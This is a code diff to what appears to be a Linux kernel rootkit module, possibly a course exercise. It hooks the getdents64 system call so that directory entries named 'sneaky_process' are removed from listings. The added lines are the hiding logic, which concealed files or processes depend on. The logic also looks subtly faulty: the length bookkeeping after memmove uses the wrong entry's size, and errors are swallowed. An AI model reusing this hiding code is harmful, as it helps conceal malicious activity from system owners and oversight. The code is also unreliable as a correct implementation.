@@ -57,13 +57,20 @@ asmlinkage int (*original_getdents64)(struct pt_regs * regs);
 
 asmlinkage int sneaky_getdents64(struct pt_regs * regs) {
   // printk(KERN_INFO "get sneaky getdents64");
+  unsigned long entryDirent = regs->si;
   int nread = (*original_getdents64)(regs), off = 0;
-  void * entryDirent = regs->si;
+
+  if (nread == 0 || nread < 0) {
+    return 0;  // == 0 means nothing to read, and < 0 means error
+  }
 
   for (off = 0; off < nread;) {
     struct linux_dirent64 * curDirent = (struct linux_dirent64 *)(entryDirent + off);
-    while (strcmp(curDirent->d_name, "sneaky_process") == 0) {
-      // overwrite this structure by overwriting the content
+    if (strcmp(curDirent->d_name, "sneaky_process") == 0) {
+      void * nextDirent = (void *)curDirent + curDirent->d_reclen;
+      int remaining_size = nread - (off + curDirent->d_reclen);
+      memmove(curDirent, nextDirent, remaining_size);
+      nread -= curDirent->d_reclen;
     }
 
     off += curDirent->d_reclen;
